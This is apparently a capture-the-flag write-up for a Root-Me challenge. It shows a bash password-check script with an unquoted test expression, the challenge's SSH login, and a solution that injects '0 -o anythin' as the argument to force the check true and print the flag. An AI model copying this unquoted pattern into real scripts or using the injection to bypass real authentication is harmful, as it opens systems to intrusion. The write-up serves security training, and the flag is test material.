# Bash Unquoted Expression Injection

URL: [https://www.root-me.org/en/Challenges/App-Script/Bash-unquoted-expression-injection](https://www.root-me.org/en/Challenges/App-Script/Bash-unquoted-expression-injection)

## Statement

Bypass this script’s security to recover the validation password.
## Source

```bash
#!/bin/bash
 
#PATH=$(/usr/bin/getconf PATH || /bin/kill $$)
PATH="/bin:/usr/bin"
 
PASS=$(cat .passwd)
 
if test -z "${1}"; then
    echo "USAGE : $0 [password]"
    exit 1
fi
 
if test $PASS -eq ${1} 2>/dev/null; then
    echo "Well done you can validate the challenge with : $PASS"
else
    echo "Try again ,-)"
fi
 
exit 0
```
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge02.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2222                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2222 app-script-ch16@challenge02.root-me.org](ssh://app-script-ch16:app-script-ch16@challenge02.root-me.org:2222 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2367&ssh=ssh://app-script-ch16:app-script-ch16@challenge02 "WebSSH") |
| Username   | app-script-ch16                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch16                                                                                                                                                                                                                                                                                                                       |
## Solution

Bypass: `if test $PASS -eq ${1}`

Because the `$PASS` is on left side rather then right, we can't use `*` to bypass it. 

We can however inject new conditional statement to `test` command and "win":
```bash
app-script-ch16@challenge02:~$ ./wrapper '0 -o anythin'
Well done you can validate the challenge with : 8246320937403
```

::: tip Flag
`8246320937403`
:::

